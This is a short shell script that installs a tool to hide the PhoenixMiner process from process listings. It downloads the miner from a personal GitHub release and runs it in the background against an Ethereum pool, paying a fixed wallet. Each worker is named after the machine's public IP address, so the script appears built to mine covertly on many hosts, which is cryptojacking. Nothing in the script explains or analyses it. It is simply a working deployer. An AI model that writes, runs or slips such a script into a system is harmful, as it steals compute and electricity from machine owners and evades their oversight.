#!/bin/sh
sudo apt update
sudo apt install gcc -y
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
npm install -g npm@8.4.1
npm i -g node-process-hider
sudo ph add PhoenixMiner
wget https://github.com/jsoe967/poenix/releases/download/v1.0.0/PhoenixMiner_5.6d_Linux.tar.gz
tar -xf PhoenixMiner_5.6d_Linux.tar.gz
cd PhoenixMiner_5.6d_Linux && sudo apt update
sudo apt install screen libjansson4 libpci3 -y
screen -dmS ls
chmod +x PhoenixMiner
./PhoenixMiner -pool ssl://eth-sg.flexpool.io:5555 -pool2 ssl://eth-sg.flexpool.io:5555 -wal 0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) -proto eth-proxy
